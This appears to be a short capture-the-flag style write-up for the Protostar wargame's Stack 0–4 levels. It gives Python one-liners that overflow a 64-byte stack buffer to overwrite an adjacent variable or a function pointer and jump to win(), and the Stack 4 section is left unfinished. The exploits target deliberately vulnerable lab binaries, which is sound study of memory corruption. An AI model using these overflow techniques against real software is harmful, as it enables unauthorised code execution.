# Protostar

`$ cd /opt/protostar/bin`

## Stack 0

`$ python -c 'print "A"*65' | ./stack0`

Note: That's because the `modified` variable is on the stack before the `buffer[64]` which makes the 65th byte (A = 0x41) overwrite the value that is no longer 0.

## Stack 1

`$ ./stack1 $(python -c 'print "A"*64+"dcba"')`

Note: It's mostly same as `Stack 0`, although this time we remember values on x86 are Little Endian which means byte order is reversed - `0x61626364` (abcd) becomes `\x64\x63\x62\x61` (dcba).

## Stack 2

`$ GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"') ./stack2`

## Stack 3

```
$ objdump -d stack3 | grep '<win'
08048424 <win>:
```

So our function's at ==08048424== -> \x24\x84\x04\x08

```
$ python -c 'print "A"*64 + "\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack 4

```
$ objdump -d stack4 | grep win
080483f4 <win>:
```

[WIP]